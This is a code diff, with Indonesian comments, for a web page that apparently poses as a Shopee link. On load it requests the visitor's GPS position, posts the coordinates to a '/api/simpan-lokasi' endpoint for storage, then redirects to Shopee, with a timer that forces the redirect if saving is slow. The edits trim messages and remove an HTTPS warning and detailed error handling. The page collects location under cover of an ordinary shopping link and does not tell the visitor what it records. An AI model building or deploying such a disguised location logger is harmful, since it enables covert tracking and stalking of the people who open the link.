@@ -72,15 +72,14 @@
         }
       }
 
-      // Waktu batas maksimal tunggu (10 detik) sebelum memaksa redirect jika koneksi lambat
+      // Timer cadangan maksimal 10 detik jika ada lag koneksi
       let maxWaitTimer = setTimeout(() => {
         alihkanKeShopee();
       }, 10000);
 
       async function kirimLokasiKeServer(dataGPS) {
-        updateStatus("Menyimpan data...");
+        updateStatus("Menyimpan...");
         try {
-          // Gunakan await agar browser benar-benar menunggu proses simpan ke Neon
           const response = await fetch("/api/simpan-lokasi", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -92,20 +91,12 @@
         } catch (err) {
           console.error("Gagal mengirim data ke server:", err);
         } finally {
-          // Batalkan timer darurat dan alihkan halaman setelah simpan selesai
           clearTimeout(maxWaitTimer);
           alihkanKeShopee();
         }
       }
 
       window.onload = function () {
-        if (
-          location.protocol !== "https:" &&
-          location.hostname !== "localhost"
-        ) {
-          console.warn("Geolocation membutuhkan protokol HTTPS yang aman.");
-        }
-
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             (position) => {
@@ -117,19 +108,7 @@
               kirimLokasiKeServer(dataGPS);
             },
             (error) => {
-              let infoError = "Gagal mengambil lokasi.";
-              switch (error.code) {
-                case error.PERMISSION_DENIED:
-                  infoError = "Akses lokasi ditolak oleh pengguna.";
-                  break;
-                case error.POSITION_UNAVAILABLE:
-                  infoError = "Informasi lokasi tidak tersedia.";
-                  break;
-                case error.TIMEOUT:
-                  infoError = "Waktu permintaan lokasi habis.";
-                  break;
-              }
-              console.warn(infoError);
+              console.warn("Akses GPS gagal/ditolak:", error.message);
               clearTimeout(maxWaitTimer);
               setTimeout(alihkanKeShopee, 1000);
             },
